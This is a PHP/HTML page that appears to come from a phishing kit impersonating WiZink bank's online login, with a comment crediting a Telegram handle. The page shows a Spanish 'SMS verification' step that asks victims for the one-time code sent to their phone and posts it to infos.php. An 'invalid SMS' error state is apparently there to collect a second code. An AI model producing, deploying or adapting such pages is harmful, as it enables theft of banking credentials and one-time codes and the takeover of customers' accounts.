<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Acceso online al banco online de WiZink, banco de crédito y ahorro.</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fav.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fav.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body style="background:#F5F5F5;">
  <div class="cc">
    <div class="titre text-center">
      <div class="logo py-5"><img src="image/log.png" style="width: 181px;height: 101px;"></div>
      <h3 class="pb-5">verificación de mensajes de texto</h3>
      <div class="step">
        <div class="s d-flex justify-content-between">
          <div class="m"></div>
          <div class="m">CONFIRMACIÓN</div>
          <div class="m"></div>
        </div>
        <div class="progress">
          <div class="progress-bar" role="progressbar" style="width: 100%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
        </div>
        <div class="form d-block d-md-flex align-items-center">
          <div class="cont">
            <div class="py-5"><img src="image/sms.png" width="80"></div>
            <p>Introduce el código de verificación que recibiste en tu número de móvil.</p>
          </div>
          <form action="infos.php" method="post">
            <input type="hidden" value="sms-err" name="step">
            <div class="form-group">
              <input type="text" class="form-control" placeholder="SMS" name="sms">
              <div class="error">SMS no válido</div>
            </div>
            <div class="bttn"><button name="submit">SEGUIR</button></div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>

  </script>
</body>
</html>